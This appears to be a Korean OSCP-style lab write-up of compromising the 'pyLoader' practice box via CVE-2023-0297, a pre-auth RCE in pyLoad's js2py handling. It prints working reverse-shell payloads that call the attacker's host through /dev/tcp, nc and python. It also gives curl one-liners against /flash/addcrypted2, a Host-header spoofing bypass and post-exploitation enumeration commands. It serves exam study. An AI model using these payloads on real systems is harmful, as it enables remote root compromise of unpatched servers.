화면에 뜬 `0.5.0` 과 실제 패키지 버전은 표기법이 다르다. 웹UI 정보 페이지는 `0.5.0` 이라고만 보여주는데 PyPI 의 실제 버전은 `0.5.0b3.dev31` 같은 PEP 440 개발 릴리스 표기다. dev30 이면 취약하고 dev31 이면 안전인데 화면은 둘 다 `0.5.0` 이니, **화면만으로는 취약 여부를 판정할 수 없다.** 판정하려 애쓰지 말고 그냥 쏘는 편이 빠르다 — `curl` 한 줄이라 3초면 결론이 난다(3-3). 1-3에서 판정 비용이 시도 비용보다 크면 시도하라고 적은 이유가 이것이다.

참고로 GitHub 저장소의 최신 태그는 `v0.4.20`(2020)이다. 0.5.x 는 태그도 릴리스도 없이 PyPI 로만 나갔으므로, GitHub 릴리스 페이지만 보고 최신이 0.4.20 이라고 판단하면 틀린다.

패치 커밋은 `7d73ba7919e5` (2023-01-03), 메시지는 `"fix arbitrary python code execution by abusing js2py functionality"` 다. 바뀐 파일은 `src/pyload/core/utils/misc.py` 하나이고 `1 insertion(+), 2 deletions(-)` 다. 커밋 원문 그대로:

```diff
@@ -1,12 +1,11 @@
 # -*- coding: utf-8 -*-
 
 import random
-import socket
 import string
 
 import js2py
 
-from .check import is_mapping
+js2py.disable_pyimport()
 
 
 def random_string(length):
```

실제 `git show --stat` 은 `1 file changed, 1 insertion(+), 2 deletions(-)` 이고 `-import socket` 도 함께 지워진다(같은 커밋에서 미사용 임포트를 정리했다). 보안 관점의 요지 — 막은 것은 `pyimport` 한 줄뿐이라는 것 — 은 그대로지만, 코드펜스 안의 diff 는 1차 사료 인용이라 원문과 한 글자도 달라선 안 된다. 요약하고 싶으면 코드펜스 밖 산문으로 쓴다.

그리고 이 패치는 취약 엔드포인트를 건드리지 않았다. `cnl_blueprint.py` 는 이 커밋에서 한 글자도 바뀌지 않았고, `local_check` 의 `REMOTE_ADDR` 신뢰도 `eval_js(f"{jk} f()")` 도 그대로 남았다. **막은 것은 `pyimport` 뿐이다.** 결과도 예상대로였다 — CVE-2024-39205(CVSS 9.8, `pyload-ng <= 0.5.0b3.dev85`)가 같은 `/flash/addcrypted2` 엔드포인트에서 `pyimport` 없이 js2py 샌드박스를 탈출해 RCE 를 재현했다. 근본 해결은 2025-08-20 커밋 `aa9300fb4e52` "remove js2py and dukpy in favour of mini-racer" 로, js2py 를 통째로 걷어낸 것이다. **이 CVE 가 패치됐다는 문장과 이 엔드포인트가 안전하다는 문장은 별개다.** 같은 진입점에 후속 CVE 가 붙었는지 항상 확인한다.

### 2-5. 왜 이 페이로드인가 — 조각별 해설

실제로 날아간 HTTP 요청 본문(익스플로잇 스크립트 원문 그대로):

```
jk=pyimport%20os;os.system("bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.156%2F4444%200%3E%261%27");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

URL 디코딩하면 `jk` 파라미터의 실체는 이것이다.

```javascript
pyimport os;
os.system("bash -c 'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1'");
f = function f2(){};
```

조각별로 뜯어보면 이렇다.

| 조각 | 역할 | 빠지면 어떻게 되는가 |
|---|---|---|
| `jk=` | Click'n'Load 의 "복호화 키를 만드는 JS 조각" 파라미터. 서버가 이 값을 `js2py` 에 넘긴다 | 다른 파라미터에 넣으면 실행되지 않는다. 이것이 유일한 코드 실행 통로다 |
| `pyimport os` | js2py 확장 키워드로 파이썬 `os` 모듈을 JS 스코프에 주입 | 순수 JS만으로는 OS 명령을 못 부른다. **이 한 단어가 CVE의 본체다** |
| `os.system("...")` | 임포트한 파이썬 모듈로 셸 명령 실행 | — |
| `f=function f2(){};` | `f` 라는 이름의 함수를 정의한다 | 핸들러 코드가 `eval_js(f"{jk} f()")` 이므로 평가되는 최종 JS는 `<우리 페이로드> f()` 다. `f` 가 정의돼 있지 않으면 그 자리에서 `ReferenceError` 가 난다. 우리 명령은 이미 그 앞줄에서 실행된 뒤라 셸은 붙지만, 예외 없이 끝내려고 넣는다. 이름이 `f` 인 것은 우연이 아니라 소스에 하드코딩된 호출명이다 |
| `package=xxx` `crypted=AAAA` `passwords=aaaa` | 핸들러가 요구하는 나머지 필수 폼 필드를 아무 값으로나 채운 것 | 누락하면 핸들러가 파라미터 파싱 단계에서 실패해 `jk` 평가에 도달하기 전에 끝난다 |
| `&&passwords=` | 이중 앰퍼샌드 — 빈 파라미터 하나가 낀다 | 무해하다. 원 스크립트의 오타로 보이며 동작에 영향이 없다 |

> [!danger] URL 인코딩이 페이로드의 일부다 — `%20`·`%26`·`%27`·`%2F`
> 본문은 `Content-Type: application/x-www-form-urlencoded` 로 전송된다. 이 포맷에서 `&` 는 파라미터 구분자이고 `+` 는 공백이다.
>
> | 원문 | 인코딩 | 인코딩하지 않으면 |
> |---|---|---|
> | `>&` (리다이렉션) | `%3E%26` | **`&` 에서 `jk` 파라미터가 잘린다.** 페이로드가 `...bash -i >` 까지만 남아 셸이 안 붙는다. 가장 흔한 실패다 |
> | `'` (작은따옴표) | `%27` | 셸에 따라 인용이 깨진다 |
> | ` ` (공백) | `%20` | 폼 인코딩에서 raw 공백은 파서에 따라 불안정 |
> | `/` | `%2F` | 본문에서는 필수가 아니다. 안전빵으로 감싼 것 |
>
> 리버스셸 페이로드를 HTTP 파라미터로 밀어넣을 때는 `&`·`;`·`#`·`+`·`%`·공백을 퍼센트 인코딩한다. [[Squid]]·[[Hawat]]·[[Exfiltrated]]에서 반복된 "인용이 깨지면 인코딩으로 도망간다" 패턴의 HTTP 판이다.

리버스셸 부분 자체도 조각별로 짚어둔다.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1'
```

| 조각 | 역할 |
|---|---|
| `bash -c '...'` | `os.system()` 은 `/bin/sh` 로 실행한다. **Ubuntu 의 `/bin/sh` 는 dash 이고 dash 에는 `/dev/tcp` 가 없다.** `bash -c` 로 한 겹 감싸 bash 에게 넘기는 것이 필수 |
| `bash -i` | 대화형 셸 — 프롬프트가 나오고 잡 제어를 시도한다 |
| `>&` | stdout과 stderr를 함께 리다이렉트 (`> ... 2>&1` 의 축약) |
| `/dev/tcp/IP/PORT` | bash 내장 의사 파일. 실제 파일이 아니라 bash 가 TCP 소켓을 열어주는 특수 경로 |
| `0>&1` | stdin을 그 소켓으로 되돌린다 — 이게 있어야 우리가 친 명령이 타겟으로 흘러간다 |

> [!warning] `/dev/tcp` 는 bash 전용이고, 컴파일 옵션으로 꺼져 있을 수 있다
> `--disable-net-redirections` 로 빌드된 bash(일부 배포판·컨테이너)에서는 존재하지 않는다. 안 붙으면 대안으로 넘어간다:
> ```bash
> # 1순위
> bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
> # 2순위 — mkfifo (nc가 -e 없이 빌드됐어도 동작)
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f
> # 3순위 — 파이썬 (이 박스는 파이썬 앱이므로 확실히 있다)
> python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
> ```
> 이 박스는 pyLoad 가 파이썬 앱이므로 3순위가 가장 확실했다. 이미 `pyimport os` 로 파이썬 안에 있으니 `pty` 까지 바로 쓸 수 있어, TTY 를 갖춘 셸을 한 방에 얻을 수 있었다.

---

## 3. Foothold

### 3-1. 익스플로잇 확보 — 두 개를 받았고 하나만 썼다

먼저 GitHub 공개 익스플로잇을 클론했다.

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ git clone https://github.com/overgrowncarrot1/CVE-2023-0297.git
Cloning into 'CVE-2023-0297'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), done.
```

![[Pasted image 20260629111431.png]]

그 다음 `searchsploit`으로 exploit-db 판본도 같은 디렉터리에 받았다.

```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ searchsploit pyload
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                 | python/webapps/51532.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ searchsploit -m 51532
  Exploit: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51532
     Path: /usr/share/exploitdb/exploits/python/webapps/51532.py
    Codes: CVE-2023-0297
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/PG/pyLoader/CVE-2023-0297/51532.py
```

![[Pasted image 20260629111246.png]]
![[Pasted image 20260629111330.png]]
![[Pasted image 20260629111355.png]]

```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ ls
51532.py  CVE-2023-0297.sh  README.md
```

**`searchsploit` 은 시험에서 허용된다.** 로컬 exploit-db 사본을 검색·복사하는 도구일 뿐 익스플로잇을 자동 실행하지 않으므로, `sqlmap`(명시적 금지)이나 Metasploit(1대 한정) 같은 제약과 무관하다. **AutoRecon 도 제한 대상이 아니다** — 열거 전용이라 규정에 언급이 없다. 이 셋을 한 묶음으로 적는 오해가 흔하다.

`-m <ID>` 는 현재 디렉터리로 복사(mirror)한다. 원본(`/usr/share/exploitdb/...`)을 직접 수정하지 않게 해주므로 항상 `-m` 으로 꺼내 쓴다. `-x <ID>`(내용 보기)와 `-p <ID>`(경로·URL만)도 같이 외워둔다.

### 3-2. 실행

리스너를 먼저 띄운다. 스크립트가 리스너를 켜고 엔터를 누르라며 명시적으로 멈춘다.

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
```

```bash
┌──(kali㉿kali)-[~/PG/pyLoader/CVE-2023-0297]
└─$ bash CVE-2023-0297.sh -l 192.168.45.156 -p 4444 -w http://192.168.132.26:9666
         _____ _____  _____    ________   ___     _____  ___ ______
        |  _  |  __ \/  __ \   | ___ \ \ / / |   |  _  |/ _ \|  _  \
        | | | | |  \/| /  \/   | |_/ /\ V /| |   | | | / /_\ \ | | |
        | | | | | __ | |       |  __/  \ / | |   | | | |  _  | | | |
        \ \_/ / |_\ \| \__/\   | |     | | | |___\ \_/ / | | | |/ /
         \___/ \____/ \____/   \_|     \_/ \_____/\___/\_| |_/___/


Run nc -lvnp 4444, press enter to continue
```

![[Pasted image 20260629111457.png]]

| 인자 | 값 | 주의점 |
|---|---|---|
| `-l` | `192.168.45.156` | **칼리의 `tun0` IP다.** VPN 재접속마다 바뀐다 — `ip -br a` 로 매번 확인 |
| `-p` | `4444` | 리스너 포트와 일치해야 한다 |
| `-w` | `http://192.168.132.26:9666` | 스킴(`http://`)과 포트를 모두 적어야 한다. 스크립트가 뒤에 `/flash/addcrypted2` 를 그대로 이어 붙인다 |

리스너에 `rlwrap nc -lnvp 4444` 처럼 `rlwrap` 을 건 것은 readline 을 얹기 위해서다. ↑↓ 명령 히스토리와 ←→ 커서 이동이 생긴다. TTY 없는 리버스셸에서는 오타를 백스페이스로 못 고치는데 `rlwrap` 이 그 고통을 절반쯤 없애주므로, 리버스셸 리스너에는 항상 붙인다. `nc` 플래그는 `-l` 리슨, `-n` DNS 역조회 안 함(느려지는 것 방지), `-v` 접속 표시, `-p` 포트다.

### 3-3. ⚠️ 자동 도구 대신 — `curl` 한 줄

`CVE-2023-0297.sh` 에서 배너와 인자 파싱을 걷어내면 마지막 한 줄이 전부다.

```bash
curl -i -s -k -X POST --data-binary "jk=pyimport%20os;os.system(\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LHOST}%2F${LPORT}%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa"  "${WEBHOST}/flash/addcrypted2"
```

스크립트 없이 그대로 칠 수 있는 수동 원라이너:

```bash
curl -s -X POST --data-binary \
  'jk=pyimport%20os;os.system("bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%27");f=function%20f2(){};&package=xxx&crypted=AAAA&passwords=aaaa' \
  'http://TARGET:9666/flash/addcrypted2'
```

플래그별로는 이렇다.

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-X POST` | 메서드 강제 | `--data-binary` 가 이미 POST를 유발하므로 없어도 된다. 다만 명시가 안전 |
| `--data-binary` | 본문을 가공 없이 그대로 전송 | `-d`/`--data` 는 `@파일` 입력에서 개행을 제거한다. 인라인 문자열이면 동작은 같지만 페이로드를 파일로 빼는 순간 `-d` 는 깨지므로, 습관을 `--data-binary` 로 고정하는 편이 안전하다 |
| (Content-Type) | 자동으로 `application/x-www-form-urlencoded` | 핸들러가 요구하는 타입과 일치한다. 다른 타입으로 보내면 파라미터가 파싱되지 않는다 |
| `-i` | 응답 헤더 포함 출력 | 없어도 무방. 있으면 200/404/500 판별이 쉬워 디버깅에 유리 |
| `-s` | 진행률 억제 | 출력이 지저분해질 뿐 |
| `-k` | TLS 인증서 검증 무시 | 여기서는 무의미하다(평문 HTTP). HTTPS 타겟에서만 의미가 있다 |

**`--data-urlencode` 를 쓰면 안 된다.** 페이로드는 이미 퍼센트 인코딩된 상태라, `--data-urlencode` 를 거치면 `%` 가 다시 `%25` 로 이중 인코딩되어 서버에서 `%20` 이 공백이 아니라 문자열 `%20` 으로 복원된다. 페이로드가 통째로 죽는다.

### 3-4. 셸 획득 — 곧바로 root

```bash
┌──(kali㉿kali)-[~/PG/pyLoader]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.26] 39058
bash: cannot set terminal process group (902): Inappropriate ioctl for device
bash: no job control in this shell
root@pyloader:~/.pyload/data# whoami
whoami
root
```

> [!note] `cannot set terminal process group` · `no job control` 은 에러가 아니다
> `bash -i` 가 TTY 가 아닌 소켓 위에서 돌기 때문에 나오는 정상 경고다. 셸은 멀쩡히 동작한다.
> 다만 이 상태에서는 `ssh`·`vi` 같은 전체화면/TTY 요구 프로그램이 깨지고 Ctrl+C 가 셸을 끊는다. 필요하면 TTY 를 올린다:
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # Ctrl+Z → stty raw -echo; fg → Enter Enter
> export TERM=xterm
> ```
> 이 박스는 이미 root 라 TTY 업그레이드가 필요 없었다.
>
> "`su`·`sudo`(비밀번호 입력)도 동작하지 않는다"는 `su` 에 대해서는 틀렸다. util-linux `su` 는 TTY 가 없으면 stdin 에서 비밀번호를 읽는다:
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ tty
> not a tty
> └─$ setsid sh -c "echo wrongpw | su root" < /dev/null
> Password: su: Authentication failure      ← 동작한다. TTY를 요구하지 않는다
> └─$ su --version
> su from util-linux 2.41.2
> └─$ strings $(readlink -f /bin/su) | grep -i "must be run from a terminal"
> (출력 없음)                                ← 그 에러 문구는 바이너리에 존재하지 않는다
> ```
> [[plum]]이 정확히 이 경로로 root 를 잡았고 그 노트의 스크린샷이 증거를 품고 있다(plum 4-3). `sudo` 는 별개다 — `requiretty` 설정과 PAM 구성에 따라 갈린다.

프롬프트 `root@pyloader:~/.pyload/data#` 가 1-3의 예측을 그대로 확인해준다. 작업 디렉터리가 `/root/.pyload/data` 이고 **사용자가 root** 다.

---

## 4. 권한상승 — 없다

이 박스에는 권한상승 단계가 존재하지 않는다. **pyLoad 프로세스가 root 로 돌았기 때문**이다. 근거는 셋이고 전부 실측이다.

| # | 근거 | 출처 |
|---|---|---|
| 1 | Config Folder = `/root/.pyload` | pyLoad 정보 페이지 (익스플로잇 이전에 관측) |
| 2 | Download Folder = `/root/Downloads/pyLoad` | 같은 페이지 |
| 3 | 셸 프롬프트 `root@pyloader:~/.pyload/data#`, `whoami` → `root` | 리버스셸 |

Installation Folder 가 `/usr/local/lib/python3.10/dist-packages/pyload` 인 것을 보면 어떻게 이렇게 됐는지도 짐작이 간다. `sudo pip install pyload-ng` 로 시스템 전역에 설치한 뒤 root 셸에서 그냥 실행하면 정확히 이 모양이 된다. systemd 유닛으로 등록하고 `User=pyload` 를 지정했다면 foothold 는 비특권 계정이었을 것이고 권한상승이라는 두 번째 관문이 생겼을 것이다. **어떻게 설치했는가가 뚫렸을 때 얼마나 아픈가를 결정한다.**

### 4-1. root가 아니었다면 — 셸 잡자마자 칠 명령 5개

이 박스에서는 쓰지 않았지만 반사로 굳혀둘 순서다. 리눅스 셸을 잡으면 이 다섯 줄부터 친다.

```bash
id                                  # ① 내가 누구이고 어떤 그룹인가 (docker·lxd·disk 그룹이면 그 자체가 root 경로)
sudo -l                             # ② NOPASSWD 항목이 있는가 (있으면 GTFOBins 직행)
find / -perm -4000 -type f 2>/dev/null   # ③ SUID 바이너리
getcap -r / 2>/dev/null             # ④ 파일 capability (cap_setuid=ep 면 즉시 root)
cat /etc/crontab; ls -la /etc/cron.*     # ⑤ 크론 — 쓰기 가능한 스크립트를 root가 주기 실행하는가
```

이 박스에서 추가로 봤어야 할 곳도 하나 있다. pyLoad 설정 폴더 `/root/.pyload/` 안에는 `settings/pyload.cfg` 와 DB(`files.db`)가 있다. root 가 아니었다면 여기서 저장된 자격증명(다운로드 사이트 계정 등)을 찾아 재사용을 시도하는 것이 다음 수였다. **애플리케이션 설정 디렉터리는 대개 자격증명 저장소다** — [[plum]]에서 메일함이, [[Codo]]에서 설정 파일이 같은 역할을 했다.

---

## 5. 플래그

`/root/` 에서 곧바로 회수했다.

```bash
root@pyloader:~/.pyload/data# cd /root/
cd /root/
root@pyloader:~# ls
ls
Downloads
email5.txt
proof.txt
snap
root@pyloader:~# cat proof.txt
cat proof.txt
8e83040ffcced0d40655d685a19821af
root@pyloader:~#
```

![[Pasted image 20260629111100.png]]

| 플래그 | 경로 | 값 |
|---|---|---|
| proof (root) | `/root/proof.txt` | `8e83040ffcced0d40655d685a19821af` |

이 박스는 플래그가 1개다(`local.txt` 없음). foothold 가 이미 root 라 저권한 플래그를 둘 자리가 없다.

`ls` 결과에 `email5.txt` 가 보이는데 이 박스에서는 열어보지 않았고 필요도 없었다. 다만 랩에서 이런 파일은 다른 박스로 이어지는 힌트이거나 시나리오 소품인 경우가 많다. **root 를 잡으면 `/root/` 전체를 한 번 훑는 습관**을 들여두면 자격증명·SSH 키·백업이 나온다.

> [!tip] 시험 증거 형식 — 플래그는 한 화면에
> OSCP 는 플래그 값만으로는 인정하지 않는다. `whoami` · `hostname` · `ip a` · `cat proof.txt` 가 한 화면에 있어야 한다.
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> TTY 없는 셸에서는 `;` 로 이어 붙인 한 줄이 안전하다. 여러 번 나눠 치면 스크롤로 잘려 한 화면에 안 담긴다.

---

## 6. 막혔던 지점 / 시행착오

정찰 시작 10:45:55, root 셸 11:11 이전 — 25분 남짓이다. 큰 실패가 없었으므로 이 장은 실제로 관측된 작은 마찰과, 다음에 같은 유형에서 막힐 지점을 구분해서 적는다.

### ① 익스플로잇 둘 중 하나를 "고른" 것이 아니다 — root를 잡은 뒤에 두 번째를 받았다

산출물 디렉터리에 두 개의 익스플로잇이 공존한다.

```
/home/kali/PG/pyLoader/CVE-2023-0297/
├── 51532.py           ← exploit-db (searchsploit)
├── CVE-2023-0297.sh   ← GitHub (overgrowncarrot1)   ← 실제로 실행한 것
└── README.md
```

실측 타임스탬프로 복원한 실제 순서는 이렇다.

| 시각 | 사건 | 근거 |
|---|---|---|
| 10:45:55 → 10:46:49 | nmap 전수 스캔 (54초) | `nmap.log` 헤더/푸터 원문 |
| ~10:54 → ~11:10 | 웹UI 로그인 · 정보 페이지에서 버전·경로 확인 | 스크린샷 `20260629105429`·`105530`·`111029` |
| 11:08:04 | `git clone` — `CVE-2023-0297.sh` 확보 | `CVE-2023-0297.sh` mtime |
| ~11:08–11:11 | 익스플로잇 실행 → root 셸 → `cat proof.txt` | 스크린샷 `20260629111100`(셸 접속부터 플래그까지 한 화면) |
| 11:11:00 | 플래그 화면 붙여넣기 | 그 스크린샷의 파일명 |
| 11:12:16 | `searchsploit -m 51532` — 두 번째 익스플로잇 확보 | `51532.py` mtime |
| 11:12:46 · 11:13:30 · 11:13:55 | searchsploit 화면 붙여넣기 ×3 | 스크린샷 파일명 |
| 11:14:31 · 11:14:57 | clone·배너 화면 붙여넣기 | 스크린샷 파일명 |

> [!danger] "셸 획득 11:14 / 총 30분" 은 스크린샷과 충돌했다
>
> - `51532.py` mtime = 11:12:16 — `searchsploit -m` 이 실행된 시각이다(하드 팩트)
> - root 셸부터 `cat proof.txt` 까지가 담긴 스크린샷은 `Pasted image 20260629111100.png`, 즉 11:11:00 에 붙여넣어졌다
> - 스크린샷은 캡처 뒤에만 붙여넣을 수 있고, 캡처는 사건 뒤에만 가능하다
>
> 따라서 **root 획득은 11:11:00 이전**이고 `searchsploit -m 51532` 는 그 뒤(11:12:16)다.
>
> **[가정]** Obsidian 의 `Pasted image <타임스탬프>` 는 붙여넣기 시각이지 캡처 시각이 아니다. 실제로 clone 화면(사건 11:08:04)은 11:14:31 에 붙여졌으니 6분의 지연이 있다. 붙여넣기 시각은 사건의 상한만 준다. 그러나 상한만으로도 결론은 뒤집힌다 — 11:11:00 < 11:12:16 이기 때문이다.
>
> 프레임이 바뀐다. 두 익스플로잇 중 하나를 고른 것이 아니라, GitHub 판본으로 이미 root 를 잡은 뒤 exploit-db 판본을 참고용으로 받아본 것이다. 아래의 `51532.py` 코드 비평은 그대로 유효하지만 "버렸다"가 아니라 "돌려볼 필요가 없었다"가 정확한 서술이다.

그래도 `51532.py` 를 안 썼을 이유는 충분하다. 코드를 읽으면 답이 나온다.

```python
def runExploit(url, cmd):
    endpoint = url + '/flash/addcrypted2'
    ...
    test = requests.post(endpoint, headers={...}, data=payload)
    print('[+] The exploit has be executeded in target machine. ')
```

**응답을 아예 확인하지 않는다.** `test` 변수에 담아놓고 쓰지 않는다. 즉 이 스크립트는 완전한 블라인드다 — 명령이 실행됐는지, 404가 났는지, 500이 났는지 구분할 방법이 없고 항상 성공 메시지를 출력한다.

`doRequest()` 의 생존 확인도 미덥지 않다.

```python
res = requests.get(url + '/flash/addcrypted2')
if res.status_code == 200:
```

`/flash/addcrypted2` 에 GET 을 던지는데, POST 전용 핸들러라면 405가 나온다. 그러면 `[-] Host down!` 이라는 틀린 결론을 낸다.

[[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]·[[Squid]]에서 반복된 "응답이 성공을 뜻하지 않는다" 패턴의 사례가 이것이다. `[+] The exploit has be executeded in target machine.` 는 아무것도 증명하지 않는다 — 스크립트가 그냥 항상 찍는 문자열이다. **판정 근거는 스크립트의 출력이 아니라 리스너이고,** 리버스셸이 붙었는가 안 붙었는가만 본다. 남의 익스플로잇을 쓸 때는 성공 판정 로직이 어디에 있는지부터 읽는다. 없으면 그 스크립트는 던지기만 하는 도구다.

실제 순서는 `git clone` → `searchsploit` 이다. 근거는 셋이다.

- `searchsploit` 명령을 친 프롬프트가 이미 `~/PG/pyLoader/CVE-2023-0297` 이다. 이 디렉터리는 클론으로 생긴 것이므로 클론이 먼저다
- 산출물 파일 타임스탬프도 `CVE-2023-0297.sh`(11:08:04) → `51532.py`(11:12:16) 순이다
- 그리고 플래그 스크린샷(11:11:00)이 그 둘 사이에 있다 (위 참조)

### ② 로그인은 사실 필요 없었다 — 15분을 아낄 수 있었다

`pyload/pyload` 로 로그인해서 버전을 확인했다. 그런데 **CVE-2023-0297 은 pre-auth 다.** 익스플로잇에 세션 쿠키가 단 하나도 안 들어간다.

즉 이 순서로도 똑같이 끝났다:

```
nmap → "pyLoad"라는 이름 확인 → searchsploit pyload → "Pre-auth RCE" 확인 → 페이로드 발사
```

로그인 화면을 보면 반사적으로 기본 자격증명에서 브루트포스로 간다. 그 전에 3초짜리 확인이 있다.

```bash
searchsploit <제품명> | grep -i "pre-auth\|unauth"
```

이 박스는 기본 자격증명이 통해서 손해가 없었지만, 안 통했다면 인증부터 뚫어야 한다는 잘못된 전제로 브루트포스에 시간을 태웠을 것이다.

반대로 로그인이 성공한 것 자체는 낭비가 아니었다. 정보 페이지에서 얻은 `/root/.pyload` 가 권한상승 단계가 없다는 확신을 미리 줬고, 그 덕에 셸을 잡은 뒤 열거에 시간을 쓰지 않았다. **정찰 비용은 회수되는 경우가 많다.**

### ③ 스크립트가 리스너를 먼저 요구한다 — 순서를 틀리면 한 번 날린다

```
Run nc -lvnp 4444, press enter to continue
```

이 프롬프트에서 **엔터를 먼저 누르면 페이로드가 즉시 발사된다.** 리스너가 없으면 타겟의 `bash -i >& /dev/tcp/...` 가 connection refused 로 즉사하고, 다시 실행해야 한다. `os.system()` 은 동기 호출이라 실패해도 조용히 끝나 **화면에는 아무 에러도 안 나온다.**

> [!warning] 리버스셸이 안 붙을 때 의심 순서
> 1. 리스너가 정말 떠 있는가 — `ss -lntp | grep 4444`
> 2. LHOST 가 맞는가 — VPN IP 는 재접속마다 바뀐다. `ip -br a` 로 `tun0` 확인. **가장 흔한 원인이다**
> 3. 아웃바운드 포트가 막혔는가 — 4444가 안 되면 443 · 80 · 53 으로 갈아탄다 ([[Hawat]]에서 실제로 443만 열려 있었다)
> 4. 타겟에 bash 가 있는가 — `/bin/sh` 가 dash 면 `/dev/tcp` 가 없다 (2-5 참조)
> 5. 원격 셸이 tmux 안에 있는가 — SSH 로 칼리에 붙어 작업할 때 리스너를 tmux 에 안 띄우면 세션이 끊기며 셸도 같이 죽는다

### ④ `-A`의 OS 추측이 틀렸다 — MikroTik RouterOS라고 했다

nmap 이 `MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)` 를 후보로 냈다. 실제는 Ubuntu 22.04 / 커널 5.15.0-75 다.

MikroTik 을 믿고 RouterOS 익스플로잇(`Winbox` CVE 등)을 뒤졌다면 막다른 길이었다. RouterOS 는 8291/8728 포트를 쓰는데 그 포트가 열려 있지도 않았다. 알아챈 근거는 SSH 배너 `OpenSSH 8.9p1 Ubuntu 3ubuntu0.1` 이고, pyLoad 정보 페이지의 커널 문자열이 확정타였다.

OS 판정 근거는 강한 것부터 이 순서로 세운다.

```
① 애플리케이션이 렌더한 uname 문자열        ← 최상. 이 박스: "Linux pyloader 5.15.0-75-generic #82-Ubuntu"
② 서비스 배너의 배포판 패키지 리비전         ← 매우 강함. "8.9p1 Ubuntu 3ubuntu0.1"
③ HTTP 서버 헤더 / 기본 페이지               ← 중간
④ nmap -O / -A 의 TCP 스택 지문             ← 가장 약함. 홉이 많으면 자주 틀린다
```

**④가 ①~③과 충돌하면 ④를 버린다.** [[Codo]]에서 정리한 "`OSScan results may be unreliable` 이 붙은 추측은 버려라"와 같은 규칙이다.

### ⑤ `WebUI Port: 8000` 을 "표시 오류"로 넘겼다 — 사실은 취약점의 절반이었다

정보 페이지는 `Port: 8000`, nmap 은 `9666`. 당시에는 설정값과 실제가 어긋나는 흔한 함정([[Squid]]의 MariaDB 3307 계열)으로 읽고 넘어갔다. 익스플로잇의 `-w` 에 nmap 값을 넣었으므로 결과적으로 문제는 없었다.

그러나 이 불일치야말로 설명이 필요한 지점이었다. 2-3에서 소스로 확인한 대로 두 포트는 같은 프로세스의 서로 다른 리스너이고, 9666 프록시가 `local_check` 의 `REMOTE_ADDR` 판정을 무너뜨리는 부품이다.

시간 손실은 없었지만 이해의 공백은 있었다. 이 박스가 `extern=False` 로 구성돼 9666이 루프백에만 열려 있었다면 익스플로잇은 403 Forbidden 을 받고 실패했을 것이고, 원인을 모른 채 CVE 가 안 먹는다고 오판했을 것이다.

**설명이 안 되는 관측을 그냥 넘기지 않는 편이 낫다.** 포트가 두 개, 버전이 두 개, 응답이 두 종류 — 이런 어긋남은 대개 우연이 아니라 구조의 흔적이다. 시험장에서 전부 파고들 시간은 없지만 왜 그런지 모르겠다고 인지는 하고 있어야 나중에 막혔을 때 그 지점으로 돌아올 수 있다. 이 박스에서는 왜 9666과 8000이 둘 다 있는가가 그 질문이었고, 답이 곧 pre-auth 가 성립하는 이유였다.

### ⑥ 이 유형에서 흔히 막히는 지점 (이 박스에서는 겪지 않았다 — 구분해서 적는다)

아래는 실측이 아니라, 같은 유형을 다시 만났을 때의 대비표다.

| 증상 | 원인 후보 | 확인 / 대응 |
|---|---|---|
| POST는 200인데 셸이 안 붙는다 | `&` 를 인코딩 안 해서 `jk` 가 잘림 | 페이로드에서 `>&` → `%3E%26` 확인. 본문 전체를 작은따옴표로 감쌌는지 확인 |
| `403 Forbidden` | ★ `local_check` 에 걸렸다 — 이 포트가 ClickNLoad 프록시가 아니라 웹UI 본체다 | **`Host: 127.0.0.1:9666` 헤더를 위조**해 본다. `local_check` 의 `or` 두 번째 가지가 `HTTP_HOST` 를 믿는다: `curl -H 'Host: 127.0.0.1:9666' ...` |
| `404 Not Found` | 엔드포인트 경로가 다른 버전 | `/flash/addcrypted2` 외에 `/flash/add`·`/flash/addcrypted` 시도 |
| `405 Method Not Allowed` | GET으로 보냄 | POST + `application/x-www-form-urlencoded` |
| `302 → /login` | `/flash/*` 가 아닌 경로로 보냄 | 인증 예외는 `/flash/*` 뿐이고 다른 경로는 전부 튕긴다 |
